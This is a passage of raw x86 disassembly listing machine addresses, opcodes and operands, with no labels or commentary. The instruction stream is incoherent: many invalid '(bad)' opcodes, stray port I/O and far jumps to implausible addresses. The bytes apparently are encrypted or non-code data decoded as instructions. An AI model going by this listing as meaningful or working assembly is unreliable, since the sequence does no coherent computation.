  401858:	adc    BYTE PTR [edi],bh
  40185a:	pop    ds
  40185b:	xchg   DWORD PTR [eax],edi
  40185d:	enter  0x309a,0xa7
  401861:	dec    edi
  401862:	sub    al,0xdc
  401864:	call   0xf4bd8e2
  401869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40186a:	fsub   DWORD PTR [ebp+0x71ac640d]
  401870:	jmp    0x40182c
  401872:	sbb    eax,0x1b2e8ba3
  401877:	mulps  xmm1,XMMWORD PTR [edx]
  40187a:	inc    esi
  40187b:	mov    cl,bh
  40187d:	adc    ebx,DWORD PTR [esi+0x2c]
  401880:	adc    al,0x1
  401882:	retf   
  401883:	pop    ecx
  401884:	cld    
  401885:	cmp    ah,BYTE PTR ds:0xa0e676cb
  40188b:	es xchg esp,eax
  40188d:	mov    al,BYTE PTR [edi]
  40188f:	ins    BYTE PTR es:[edi],dx
  401890:	xchg   esp,eax
  401891:	dec    eax
  401892:	jne    0x401848
  401894:	(bad)  [edx+0x2d8e1d02]
  40189a:	mov    al,ds:0x6512daf4
  40189f:	inc    edx
  4018a0:	mov    al,0x9
  4018a2:	mov    bh,0x64
  4018a4:	sub    BYTE PTR es:[ebp-0x3e40deef],cl
  4018ab:	shl    DWORD PTR [eax-0x6e],1
  4018ae:	mov    WORD PTR [ebp-0x4c],?
  4018b1:	int3   
  4018b2:	dec    edx
  4018b3:	inc    eax
  4018b4:	je     0x40187b
  4018b6:	outs   dx,DWORD PTR ds:[esi]
  4018b7:	(bad)  
  4018b8:	cdq    
  4018b9:	in     eax,0x95
  4018bb:	mov    WORD PTR [esi],?
  4018bd:	loope  0x401901
  4018bf:	jecxz  0x4018d5
  4018c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018c2:	fstp   TBYTE PTR [ebp-0x4e35a3fc]
  4018c8:	fwait
  4018c9:	xchg   BYTE PTR [esi+0xd],dh
  4018cc:	int3   
  4018cd:	ds sbb eax,0x9cc827b6
  4018d3:	jle    0x4018e3
  4018d5:	stos   DWORD PTR es:[edi],eax
  4018d6:	shl    DWORD PTR ss:[eax+0x5f],cl
  4018da:	sar    DWORD PTR [esi+0x6376f83e],0xea
  4018e1:	mov    edx,0xc1e2400e
  4018e6:	jmp    0xec5e35aa
  4018eb:	dec    eax
  4018ec:	dec    ebp
  4018ed:	pop    ds
  4018ee:	jmp    0xcfa2c015
  4018f3:	or     eax,0xe3c3a8d3
  4018f8:	push   ebx
  4018f9:	fdiv   st,st(7)
  4018fb:	mov    bh,0x62
  4018fe:	ret    
  4018ff:	fidiv  WORD PTR [ebx]
  401901:	rcr    BYTE PTR [ebp-0x2b],0xcb
  401905:	xchg   esp,eax
  401906:	gs pop es
  401908:	ret    0x69ed
  40190b:	or     BYTE PTR [ebx-0x47c94f1c],ch
  401911:	aad    0x16
  401913:	push   ds
  401914:	adc    eax,0xaa640eda
  401919:	cs dec edx
  40191b:	xchg   BYTE PTR [ebx+0x42c63588],bl
  401921:	xchg   esi,eax
  401922:	mov    eax,ds:0xf028cc40
  401927:	int3   
  401928:	std    
  401929:	(bad)  
  40192b:	add    eax,0xc7fd22f2
  401930:	test   BYTE PTR [edi-0x23],bh
  401933:	(bad)  
  401934:	es pop es
  401936:	jmp    0x401962
  401938:	push   esi
  401939:	ror    edx,1
  40193b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40193c:	xor    ch,bl
  40193e:	add    ecx,DWORD PTR [ebx]
  401940:	mov    edx,0xd8a6bd19
  401945:	rol    DWORD PTR [eax],0xb4
  401948:	add    cl,BYTE PTR [edi]
  40194a:	inc    edx
  40194b:	inc    edx
  40194c:	stc    
  40194d:	call   0x59d21a69
  401952:	fdiv   st,st(7)
  401954:	shl    ecx,1
  401956:	pop    ebx
  401957:	or     al,0xd8
  401959:	jmp    0x101a9615
  40195e:	mov    ecx,0xf6abc388
  401963:	inc    edi
  401964:	or     DWORD PTR [ebp+0x5e4c7cc1],ebp
  40196a:	push   0x202453d5
  40196f:	pushf  
  401970:	pushf  
  401971:	mov    esp,0xef1c43e1
  401976:	int3   
  401977:	pop    eax
  401978:	sbb    eax,0xc3092ffb
  40197d:	aaa    
  40197e:	mov    esi,0x7b865780
  401983:	and    al,0xec
  401985:	inc    esi
  401986:	sar    BYTE PTR [edi+0x202877b7],cl
  40198c:	sub    BYTE PTR [ebx-0x44124729],cl
  401992:	ins    BYTE PTR es:[edi],dx
  401993:	icebp  
  401994:	lahf   
  401995:	enter  0x1a2f,0x4b
  401999:	fnstenv gs:[eax]
  40199c:	mov    DWORD PTR [ebx],ecx
  40199e:	retf   
  40199f:	mov    al,0xfe
  4019a1:	out    dx,al
  4019a2:	add    ebx,DWORD PTR [ecx+ebx*8-0x41b5c701]
  4019a9:	sub    eax,0xd933e4a1
  4019ae:	inc    esi
  4019af:	mov    cl,0xa9
  4019b1:	inc    ebp
  4019b2:	cmp    bh,al
  4019b4:	ds xchg esp,eax
  4019b6:	scas   al,BYTE PTR es:[edi]
  4019b7:	addr16 pushf 
  4019b9:	es cmp eax,0xb9699e08
  4019bf:	call   0x9a83:0x94fd87e1
  4019c6:	imul   ebx,DWORD PTR [edi-0x61],0x5d8a5caf
  4019cd:	sbb    eax,0x1f4eff12
  4019d2:	inc    edi
  4019d3:	pop    eax
  4019d4:	xchg   ebp,eax
  4019d5:	add    al,0x8e
  4019d7:	fnstenv [edx+0x2e]
  4019da:	dec    ebx
  4019db:	and    bl,BYTE PTR [edx+0x4a]
  4019de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019df:	test   eax,0x492deb0b
  4019e4:	pushf  
  4019e5:	jmp    0x1b976708
  4019ea:	sti    
  4019eb:	into   
  4019ec:	lods   al,BYTE PTR ds:[esi]
  4019ed:	or     BYTE PTR ss:[edx],ch
  4019f0:	adc    bh,ah
  4019f2:	sub    BYTE PTR [esi],0x1f
  4019f5:	xor    al,0x83
  4019f7:	xchg   BYTE PTR [esi+0x19],dl
  4019fa:	inc    esi
  4019fb:	xchg   esi,eax
  4019fc:	hlt    
  4019fd:	mov    edi,0xf09f3590
  401a02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a03:	test   BYTE PTR [ebp+eax*4-0x32],ah
  401a07:	adc    cl,dl
  401a09:	retf   0xc436
  401a0c:	cmp    ch,al
  401a0e:	fwait
  401a0f:	xor    ecx,eax
  401a11:	retf   
  401a12:	xchg   ecx,eax
  401a13:	js     0x4019bf
  401a15:	or     edx,DWORD PTR [ebx+0x66]
  401a18:	sub    BYTE PTR [edx+edx*1],dh
  401a1b:	push   0xbac29092
  401a20:	in     eax,0x6
  401a22:	xor    ch,0x17
  401a25:	or     DWORD PTR [ebx+0x41],edi
  401a28:	mov    ds:0x1b73ef73,al
  401a2d:	(bad)  
  401a2e:	je     0x401a56
  401a30:	or     edi,0xec44e103
  401a36:	mov    edx,DWORD PTR [edx-0x33]
  401a39:	push   0xffffff9e
  401a3b:	cmp    edx,DWORD PTR [ebx-0x2cc33e98]
  401a41:	bound  ecx,QWORD PTR [ebp+0x3a]
  401a44:	inc    eax
  401a45:	push   0xffffffe3
  401a47:	sub    esp,DWORD PTR [edx+0x52]
  401a4a:	mov    bl,BYTE PTR [esi+edi*8+0x18]
  401a4e:	sbb    al,0x70
  401a50:	int3   
  401a51:	mov    dh,0x2
  401a53:	or     ch,BYTE PTR [ecx+0x59]
  401a56:	ret    
  401a57:	aas    
  401a58:	int    0x9b
  401a5a:	pop    edx
  401a5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a5c:	jb     0x401a2f
  401a5e:	lods   al,BYTE PTR ds:[esi]
  401a5f:	xchg   ebp,eax
  401a60:	fs fwait
  401a62:	aaa    
  401a63:	call   0x7546ab83
  401a68:	mov    edx,0xe57335ce
  401a6d:	xchg   BYTE PTR [ecx+eiz*2-0x48dbc77c],ah
  401a74:	sti    
  401a75:	lahf   
  401a76:	dec    esp
  401a77:	(bad)  
  401a78:	leave  
  401a79:	add    BYTE PTR [esi-0x18994295],ah
  401a7f:	cmp    ecx,eax
  401a81:	nop
  401a82:	mov    dl,0x1a
  401a84:	mov    edi,0xc5650066
  401a89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a8a:	pop    ss
  401a8b:	shl    DWORD PTR [ecx+0x45],cl
  401a8e:	cwde   
  401a8f:	aaa    
  401a90:	push   edx
  401a91:	cmp    DWORD PTR [edx],eax
  401a93:	gs mov dl,0x85
  401a96:	mov    ds:0xa798e341,eax
  401a9b:	imul   edx,DWORD PTR [ecx-0x15],0xffffff82
  401a9f:	cmp    al,0x9e
  401aa1:	inc    ebx
  401aa2:	cld    
  401aa3:	mov    esp,0x9cd43ccd
  401aa8:	pop    ebp
  401aa9:	cmp    eax,0x3f146a3e
  401aae:	aam    0x37
  401ab0:	adc    al,0x61
  401ab2:	mov    ebp,0x5e229bc6
  401ab7:	jne    0x401afa
  401ab9:	add    ah,BYTE PTR [edx]
  401abb:	adc    al,0x76
  401abd:	loope  0x401ad9
  401abf:	(bad)  
  401ac1:	mov    ds:0x2a9016fe,al
  401ac6:	mov    dh,0xe0
  401ac8:	int    0x65
  401aca:	adc    al,0x9f
  401acc:	dec    esp
  401acd:	pop    ecx
  401ace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401acf:	(bad)  [esi]
  401ad1:	add    al,0x30
  401ad3:	das    
  401ad4:	test   eax,0xe861f074
  401ad9:	xor    BYTE PTR [ebp*2-0x5ba31992],bh
  401ae0:	sbb    eax,0x4181f8b0
  401ae5:	(bad)  
  401ae6:	push   ds
  401ae7:	jge    0x401af2
  401ae9:	jno    0x401ad3
  401aeb:	jge    0x401aa9
  401aed:	push   ebp
  401aee:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401af0:	and    eax,0x37aac7c0
  401af5:	icebp  
  401af6:	sub    BYTE PTR [esi],al
  401af8:	add    bh,bl
  401afa:	and    eax,0xb0afb0af
  401aff:	rcr    dl,1
  401b01:	sub    DWORD PTR [ebp-0x5fecc7ea],0xffffffa4
  401b08:	sbb    DWORD PTR [edi+0x7e],edi
  401b0b:	xlat   BYTE PTR ds:[ebx]
  401b0c:	fnsave [ecx]
  401b0e:	cmc    
  401b0f:	jmp    0xb738:0xc33f8825
  401b16:	push   esi
  401b17:	cdq    
  401b18:	xchg   DWORD PTR [ebx+0x2a],edx
  401b1b:	jecxz  0x401b5a
  401b1d:	mov    ah,0x86
  401b1f:	test   al,0x40
  401b21:	jo     0x401b7d
  401b23:	scas   eax,DWORD PTR es:[edi]
  401b24:	inc    esi
  401b25:	inc    ebx
  401b26:	xchg   ebp,eax
  401b27:	adc    DWORD PTR [edx],esp
  401b29:	add    al,0x6
  401b2b:	adc    bh,BYTE PTR [edi]
  401b2d:	pop    esi
  401b2e:	cmp    eax,0x4ce4c9b0
  401b33:	pop    eax
  401b34:	and    al,0x3b
  401b36:	ss inc ebx
  401b38:	mov    eax,0x1add692
  401b3d:	cs xchg esi,eax
  401b3f:	pusha  
  401b40:	addr16 nop
  401b42:	popf   
  401b43:	or     DWORD PTR [edi],edi
  401b45:	daa    
  401b46:	(bad)
  401b49:	aam    0x58
  401b4b:	xchg   BYTE PTR [edi+0x13],dh
  401b4e:	lods   eax,DWORD PTR ds:[esi]
  401b4f:	(bad)  [edi]
  401b51:	dec    ebp
  401b52:	jg     0x401b3c
  401b54:	rcr    BYTE PTR [ebp-0x7c],1
  401b57:	retf   0xb88a
  401b5a:	jne    0x401b46
  401b5c:	ss adc ch,ch
  401b5f:	and    edi,esp
  401b61:	(bad)  
  401b62:	mov    ds:0x5ff0cee5,al
  401b67:	xor    eax,0x232a7a21
  401b6c:	jb     0x401ba2
  401b6e:	cmp    al,0x6
  401b70:	push   ebp
  401b71:	imul   ebx,edi,0xffffffcd
  401b74:	and    ebx,esi
  401b76:	(bad)  
  401b77:	loopne 0x401bd2
  401b79:	push   es
  401b7a:	dec    ebp
  401b7b:	and    DWORD PTR [ebp+eax*2+0x71],ebx
  401b7f:	repz je 0x401b56
  401b82:	(bad)  
  401b84:	aas    
  401b85:	sbb    cl,al
  401b87:	arpl   WORD PTR [edx+0x59],bp
  401b8a:	mov    al,ds:0xbdd49b3e
  401b8f:	and    DWORD PTR [eax+0x65d7be34],esi
  401b95:	sub    DWORD PTR [esi+ecx*4+0x56],0xb2a1d76
  401b9d:	mov    ecx,0x760b29f4
  401ba2:	jle    0x401be7
  401ba4:	mov    ds:0x90bd5c3b,eax
  401ba9:	cli    
  401baa:	and    BYTE PTR [edx+0x6d],dh
  401bad:	aad    0x1d
  401baf:	inc    ebx
  401bb0:	nop
  401bb1:	sbb    DWORD PTR [esp+ebp*1-0x65d3dcb9],eax
  401bb8:	test   al,0x74
  401bba:	jmp    0xb1b9267
  401bbf:	addr16 jb 0x401be9
  401bc2:	dec    esi
  401bc3:	rol    dh,cl
  401bc5:	inc    esi
  401bc6:	add    bl,BYTE PTR ds:0xc8d1f310
  401bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bcd:	and    BYTE PTR [ebp+0x56],ah
  401bd0:	mov    dh,0x93
  401bd2:	cs mov edx,0xd9e0a764
  401bd8:	mov    edx,0x262e913b
  401bdd:	std    
  401bde:	js     0x401c10
  401be0:	sub    al,0x2d
  401be2:	jp     0x401c4f
  401be4:	imul   eax,DWORD PTR [esi-0x839acd5],0x91a91760
  401bee:	inc    ecx
  401bef:	jbe    0x401c41
  401bf1:	mov    edx,0x5dd27fbe
  401bf6:	jae    0x401c63
  401bf8:	mov    ds:0xbc2d3877,al
  401bfd:	pushf  
  401bfe:	pop    esi
  401bff:	xor    BYTE PTR [esi],al
  401c01:	outs   dx,DWORD PTR ds:[esi]
  401c02:	fidiv  WORD PTR ds:0x1b0ba7ec
  401c08:	inc    esp
  401c09:	pop    ds
  401c0a:	cs pop ebx
  401c0c:	jge    0x401c89
  401c0e:	iret   
  401c0f:	cld    
  401c10:	pop    ebx
  401c11:	mov    eax,ds:0xd1c350b9
  401c16:	push   0x9a06baac
  401c1b:	mov    bh,0xce
  401c1d:	pop    ebp
  401c1e:	push   esi
  401c1f:	pop    ecx
  401c20:	jecxz  0x401bce
  401c22:	sbb    eax,0xcc6b367c
  401c27:	sbb    eax,0x503653e4
  401c2c:	add    DWORD PTR [esi+edi*1],0xffffffb2
  401c30:	mov    WORD PTR [ebp+0x4da42764],ss
  401c36:	xlat   BYTE PTR ds:[ebx]
  401c37:	ins    BYTE PTR es:[edi],dx
  401c38:	cmp    eax,0xb554c231
  401c3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c3e:	iret   
  401c3f:	jp     0x401cab
  401c41:	mov    ebp,0x434c4900
  401c46:	lea    edx,[edx]
  401c48:	mov    gs,ebp
  401c4a:	into   
  401c4b:	adc    DWORD PTR [esi],edi
  401c4d:	pop    esi
  401c4e:	je     0x401c41
  401c50:	aam    0x41
  401c52:	sahf   
  401c53:	retf   
  401c54:	xor    eax,0xdf559df2
  401c59:	add    BYTE PTR [ebp+0x36],dh
  401c5c:	fadd   DWORD PTR [eax]
  401c5e:	gs jmp 0x401c75
  401c61:	aaa    
  401c62:	jecxz  0x401c0b
  401c64:	(bad)  
  401c65:	shl    DWORD PTR [ebp+0x3880338c],1
  401c6b:	push   ss
  401c6c:	clc    
  401c6d:	adc    ch,BYTE PTR [esp+eiz*2-0x71]
  401c71:	cmp    eax,0x2d208e38
  401c76:	lahf   
  401c77:	call   0x6bca:0x2a905156
  401c7e:	ds pop ebx
  401c80:	pushfw 
  401c82:	scas   eax,DWORD PTR es:[edi]
  401c83:	loopne 0x401c4c
  401c85:	jae    0x401c62
  401c87:	lea    ebx,ds:0xb2d25289
  401c8d:	mov    al,BYTE PTR [esi+0x5911fb3f]
  401c93:	sbb    BYTE PTR [edx],al
  401c95:	pop    ebx
  401c96:	out    dx,al
  401c97:	imul   ebp,DWORD PTR ds:0xaef2badc,0xf2ce9be8
  401ca1:	loope  0x401c86
  401ca3:	cmp    al,0x5
  401ca5:	popf   
  401ca6:	or     BYTE PTR [ecx+0x290e72be],0xbc
  401cad:	repz mov bh,0x9f
  401cb0:	rep outs dx,DWORD PTR ds:[esi]
  401cb2:	mov    ebp,0x62409c07
  401cb7:	add    dl,dl
  401cb9:	aam    0xed
  401cbb:	pusha  
  401cbc:	xor    eax,0x8db91ef2
  401cc1:	mov    ?,WORD PTR [eax]
  401cc3:	sar    BYTE PTR [eax-0x334a2090],cl
  401cc9:	rcl    DWORD PTR [esi+0x51],0x43
  401ccd:	push   ecx
  401cce:	push   es
  401ccf:	inc    edi
  401cd0:	add    eax,0x29ad8aab
  401cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cd6:	mov    edi,0xa41f9a0b
  401cdb:	loop   0x401d1d
  401cdd:	enter  0x3351,0x9a
  401ce1:	sbb    BYTE PTR [esi+esi*8],al
  401ce4:	adc    DWORD PTR [esi-0xb],esp
  401ce7:	ss pusha 
  401ce9:	call   0x6147:0x9cdf6cd2
  401cf0:	xor    bh,dl
  401cf2:	or     al,0xb3
  401cf4:	in     eax,0xd8
  401cf6:	popa   
  401cf7:	inc    edi
  401cf8:	dec    edi
  401cf9:	jg     0x401ce3
  401cfb:	push   edx
  401cfc:	ror    BYTE PTR [edx],0x15
  401cff:	xchg   DWORD PTR [esi],ebp
  401d01:	inc    esp
  401d02:	sub    eax,0x64804d22
  401d07:	cmp    BYTE PTR [edi],dh
  401d09:	ret    0x73ff
  401d0c:	mov    dl,0x14
  401d0e:	inc    esp
  401d0f:	or     dh,BYTE PTR [ebp+0x1b3a5b9d]
  401d15:	push   ebx
  401d16:	es ss push ebp
  401d19:	(bad)  
  401d1a:	cmp    ch,bh
  401d1c:	mov    al,ds:0xfc598cc5
  401d21:	scas   al,BYTE PTR es:[edi]
  401d22:	inc    edx
  401d23:	or     dh,BYTE PTR [eax]
  401d25:	loopne 0x401d45
  401d27:	aaa    
  401d28:	mov    DWORD PTR [ecx+0x61],edx
  401d2b:	push   es
  401d2c:	lods   eax,DWORD PTR ds:[esi]
  401d2d:	shl    DWORD PTR [ebx-0x12],0x8a
  401d31:	fdiv   QWORD PTR [esi]
  401d33:	or     BYTE PTR [edx+0x2e],cl
  401d36:	push   es
  401d37:	daa    
  401d38:	pop    ebp
  401d39:	fmul   QWORD PTR [edi-0xc]
  401d3c:	int    0xc6
  401d3e:	test   eax,0x9bdd785a
  401d43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d44:	jg     0x401d6b
  401d46:	mov    edi,0xe956bf19
  401d4b:	pop    ebx
  401d4c:	mov    bh,0xe0
  401d4e:	test   BYTE PTR [eax+edx*8-0x79],al
  401d52:	xchg   ecx,eax
  401d53:	push   es
  401d54:	test   al,0x27
  401d56:	aad    0x3d
  401d58:	jne    0x401cfe
  401d5a:	mov    ebp,DWORD PTR [bp+di]
  401d5d:	sub    al,0xdd
  401d5f:	ins    DWORD PTR es:[edi],dx
  401d60:	jg     0x401d79
  401d62:	out    0xba,al
  401d64:	out    dx,al
  401d65:	lods   al,BYTE PTR ds:[esi]
  401d66:	ins    DWORD PTR es:[edi],dx
  401d67:	ss xchg edx,eax
  401d69:	xor    DWORD PTR [esi-0x74],ecx
  401d6c:	mov    ds:0x770e9d9b,eax
  401d71:	sti    
  401d72:	mov    BYTE PTR [ebp-0x67],bh
  401d75:	je     0x401d28
  401d77:	outs   dx,BYTE PTR ds:[esi]
  401d78:	int3   
  401d79:	mov    ds:0xe0b23ce1,eax
  401d7e:	fnsave [ebp+ebx*2+0x54]
  401d82:	in     eax,dx
  401d83:	cli    
  401d84:	pop    esp
  401d85:	jnp    0x401db1
  401d87:	add    bl,cl
  401d89:	lea    ecx,[eax-0x7ce8a205]
  401d8f:	mov    dh,0xdb
  401d91:	retf   
  401d92:	adc    eax,0xb44f5967
  401d97:	call   0x672a:0xbca397ee
  401d9e:	mov    dl,0xb9
  401da0:	jecxz  0x401d34
  401da2:	popf   
  401da3:	cdq    
  401da4:	sub    esi,DWORD PTR [ebp+0x66]
  401da7:	cmp    bh,BYTE PTR [ebx-0x18]
  401daa:	xchg   ebx,eax
  401dab:	inc    esp
  401dac:	xchg   edi,eax
  401dad:	retf   0x36d2
  401db0:	js     0x401db4
  401db2:	cwde   
  401db3:	push   ds
  401db4:	sbb    BYTE PTR [ecx+0xe],0x7
  401db8:	outs   dx,BYTE PTR ds:[esi]
  401db9:	xor    BYTE PTR [ecx+0x1],dh
  401dbc:	outs   dx,BYTE PTR ds:[esi]
  401dbd:	adc    eax,0xde474ae
  401dc2:	inc    edx
  401dc3:	mov    ebp,0x4949b394
  401dc8:	es sbb ebp,edx
  401dcb:	rol    BYTE PTR [edx+0x10],0x20
  401dcf:	mov    WORD PTR [esi+0x7bebad46],es
  401dd5:	cmp    dl,BYTE PTR [eax]
  401dd7:	jae    0x401e07
  401dd9:	jb     0x401d95
  401ddb:	add    ch,dh
  401ddd:	mov    BYTE PTR [ecx+0x6f],ah
  401de0:	ret    
  401de1:	mov    dl,0xb
  401de3:	jnp    0x401e18
  401de5:	ins    DWORD PTR es:[edi],dx
  401de6:	outs   dx,DWORD PTR ds:[esi]
  401de7:	adc    al,0x1e
  401de9:	mov    edx,0x21ad03a2
  401dee:	ss aam 0x3a
  401df1:	lea    edx,[ebx]
  401df3:	or     al,0xa0
  401df5:	and    ah,ch
  401df7:	cmc    
  401df8:	dec    edx
  401df9:	arpl   WORD PTR ds:0x73b63141,bp
  401dff:	sub    BYTE PTR [ecx-0x2a909014],0xe8
  401e06:	pusha  
  401e07:	stos   BYTE PTR es:[edi],al
  401e08:	pop    ebp
  401e09:	retf   
  401e0a:	push   ecx
  401e0b:	jg     0x401e07
  401e0d:	jmp    0x8695ed8f
  401e12:	lahf   
  401e13:	sub    eax,0xa18fee76
  401e18:	cs (bad) 
  401e1a:	inc    ebp
  401e1b:	adc    al,0x34
  401e1d:	pop    edi
  401e1e:	loopne 0x401e15
  401e20:	push   edx
  401e21:	jmp    0xa70722c
  401e26:	mov    cl,0xf2
  401e28:	pop    esp
  401e29:	mov    ds:0x9a068711,al
  401e2e:	pop    esi
  401e2f:	int    0x2f
  401e31:	in     eax,dx
  401e32:	js     0x401dcd
  401e34:	in     eax,dx
  401e35:	inc    edi
  401e36:	int    0x14
  401e38:	sbb    DWORD PTR [edx+0x30],esi
  401e3b:	jl     0x401e52
  401e3d:	ds scas al,BYTE PTR es:[edi]
  401e3f:	in     eax,dx
  401e40:	gs jg  0x401e7b
  401e43:	aad    0x3a
  401e45:	or     BYTE PTR [edx-0x43],0x56
  401e49:	push   ecx
  401e4a:	leave  
  401e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e4c:	fidivr WORD PTR [edx+0xbcd7a41]
  401e52:	add    ebp,DWORD PTR [ebx+ebx*4]
  401e55:	xor    al,0xc9
  401e57:	pop    edi
  401e58:	ss retf 
  401e5a:	jae    0x401e3a
  401e5c:	pusha  
  401e5d:	jae    0x401df7
  401e5f:	out    0xe8,al
  401e61:	(bad)  
  401e62:	stos   BYTE PTR es:[edi],al
  401e63:	nop
  401e64:	repz pop edx
  401e66:	and    BYTE PTR [ecx],dl
  401e68:	inc    eax
  401e69:	xchg   ebx,eax
  401e6a:	mov    al,ds:0xfc473d02
  401e6f:	adc    eax,0xb48cab2
  401e74:	xchg   esi,eax
  401e75:	imul   DWORD PTR [edi]
  401e77:	ficom  WORD PTR [ebx+0x7acac63f]
  401e7d:	loopne 0x401e7a
  401e7f:	mov    al,0x48
  401e81:	ret    
  401e82:	in     al,0xa8
  401e84:	es inc edi
  401e86:	stc    
  401e87:	adc    edi,DWORD PTR [ecx+0x1c87d655]
  401e8d:	jl     0x401e49
  401e8f:	(bad)  
  401e90:	daa    
  401e91:	lds    esi,FWORD PTR [ebx+eax*8+0x2b33edc9]
  401e98:	add    al,BYTE PTR [eax]
  401e9a:	hlt    
  401e9b:	je     0x401e27
  401e9d:	inc    edx
  401e9e:	fadd   QWORD PTR [ebx]
  401ea0:	xchg   edi,eax
  401ea1:	ins    DWORD PTR es:[di],dx
  401ea3:	imul   eax,DWORD PTR [ebp+0x35],0x1216cda
  401eaa:	into   
  401eab:	pop    ebx
  401eac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ead:	nop
  401eae:	stc    
  401eaf:	les    edi,FWORD PTR [edx-0x2ccc8965]
  401eb5:	repnz lods al,BYTE PTR ds:[esi]
  401eb7:	sub    eax,0x87cabeb9
  401ebc:	or     ebp,DWORD PTR [ebx]
  401ebe:	jnp    0x401ea9
  401ec0:	pop    ecx
  401ec1:	sbb    bh,dl
  401ec3:	mov    ecx,0x23b436d
  401ec8:	dec    esp
  401ec9:	leave  
  401eca:	cld    
  401ecb:	pop    esp
  401ecc:	dec    esp
  401ecd:	cmc    
  401ece:	fdivr  QWORD PTR ds:0x97847a56
  401ed4:	js     0x401f44
  401ed6:	xchg   ebx,eax
  401ed7:	lock lock sbb BYTE PTR [ebp+ebx*8+0xfcfa963],al
  401ee0:	and    cl,BYTE PTR [eax]
  401ee2:	push   ebp
  401ee3:	xor    eax,DWORD PTR [ebp+0xf864a33]
  401ee9:	jo     0x401ef8
  401eeb:	cmp    ebp,ebp
  401eed:	add    esi,DWORD PTR [eax-0x7b17127b]
  401ef3:	mov    esi,0xdc5f7bf8
  401ef8:	dec    esi
  401ef9:	adc    al,0xca
  401efb:	repnz sub al,0x6a
  401efe:	push   ax
  401f00:	mov    ds:0xa80f1691,al
  401f05:	(bad)  
  401f06:	shr    BYTE PTR [ecx+edx*8-0x249fb818],cl
  401f0d:	mov    al,0x71
  401f0f:	iret   
  401f10:	pop    ds
  401f11:	(bad)  
  401f12:	das    
  401f13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f14:	stc    
  401f15:	pop    eax
  401f16:	test   DWORD PTR [edx+0x33],0x2b09a2d3
  401f1d:	ja     0x401ec0
  401f1f:	mov    eax,ds:0x68c0443a
  401f24:	loop   0x401f0f
  401f26:	add    BYTE PTR [esi-0x26],bh
  401f29:	sar    DWORD PTR [ebx-0x48],cl
  401f2c:	sub    eax,0xeb3f3c2d
  401f31:	jle    0x401ed4
  401f33:	in     al,dx
  401f34:	jbe    0x401fa9
  401f36:	sub    edi,DWORD PTR [esi+0x7395e231]
  401f3c:	add    esi,0x8
  401f3f:	or     dh,BYTE PTR [edx+0x41]
  401f42:	test   al,0x4c
  401f44:	test   al,0x2a
  401f46:	adc    al,0xb8
  401f48:	loope  0x401f67
  401f4a:	cs cmp bh,BYTE PTR gs:[edi+0x7c3fa4ff]
  401f52:	adc    eax,0xfb99278
  401f57:	add    eax,0x151ef282
  401f5d:	add    al,0x73
  401f5f:	mov    dh,0x77
  401f61:	xchg   edx,eax
  401f62:	sub    DWORD PTR [eax],esp
  401f64:	shl    DWORD PTR [ecx-0x7885136],1
  401f6a:	sbb    dh,bl
  401f6c:	cs mov dh,0xce
  401f6f:	out    0x6f,al
  401f71:	ret    
  401f72:	mov    edx,0x6728944
  401f77:	jae    0x401fe0
  401f79:	(bad)  
  401f7a:	ds or  esp,ebp
  401f7d:	in     eax,dx
  401f7e:	mov    eax,0xd2eeb53e
  401f83:	pop    ebx
  401f84:	pop    ebx
  401f85:	mov    ecx,DWORD PTR gs:[edx+0x5d]
  401f89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f8a:	hlt    
  401f8b:	adc    ah,BYTE PTR [edi+edx*8-0x19]
  401f8f:	jns    0x401f8c
  401f91:	push   cs
  401f92:	jno    0x401f9c
  401f94:	sbb    dh,dh
  401f96:	push   eax
  401f97:	neg    BYTE PTR [edi+esi*1-0x10462527]
  401f9e:	scas   al,BYTE PTR es:[edi]
  401f9f:	dec    ebp
  401fa0:	cmp    eax,0x90823935
  401fa5:	je     0x40200d
  401fa7:	dec    edx
  401fa8:	adc    esp,edx
  401faa:	or     al,0x2
  401fac:	test   ecx,esp
  401fae:	mov    ch,0x32
  401fb0:	loop   0x401fe6
  401fb2:	xor    al,0xf4
  401fb4:	jne    0x401fac
  401fb6:	outs   dx,DWORD PTR ds:[esi]
  401fb7:	dec    DWORD PTR [esi+0x168ced95]
  401fbd:	fadd   QWORD PTR [edi-0x41d28a8f]
  401fc3:	(bad)  
  401fc4:	pop    esp
  401fc5:	push   edx
  401fc6:	lds    edx,FWORD PTR [esi-0x48061601]
  401fcc:	sub    DWORD PTR ds:0x87c9ebb1,0xb490d036
  401fd6:	std    
  401fd7:	xor    bl,BYTE PTR [ebx+ecx*1]
  401fda:	pop    edi
  401fdb:	int3   
  401fdc:	sahf   
  401fdd:	sbb    BYTE PTR [edx+ebx*4+0x78d37a40],ah
  401fe4:	pop    esp
  401fe5:	xchg   edx,eax
  401fe6:	mov    eax,0x85060943
  401feb:	cmp    ecx,DWORD PTR [eax+0x29]
  401fee:	xlat   BYTE PTR ds:[ebx]
  401fef:	mov    DWORD PTR [ecx+edi*1],ebp
  401ff2:	pop    edi
  401ff3:	jns    0x40201e
  401ff5:	daa    
  401ff6:	xchg   ecx,eax
  401ff7:	call   DWORD PTR [edx+0x69]
  401ffa:	and    ebx,DWORD PTR [eax-0x10]
  401ffd:	ins    DWORD PTR es:[edi],dx
  401ffe:	outs   dx,BYTE PTR ds:[esi]
  401fff:	cmp    DWORD PTR [esi],esp
  402001:	mov    bl,BYTE PTR [edi+0x4d]
  402004:	ret    0xa4ad
  402007:	fist   DWORD PTR [edx+eiz*4+0x565794a9]
  40200e:	sbb    al,0xe
  402010:	fiadd  WORD PTR ds:0x2d517777
  402016:	popa   
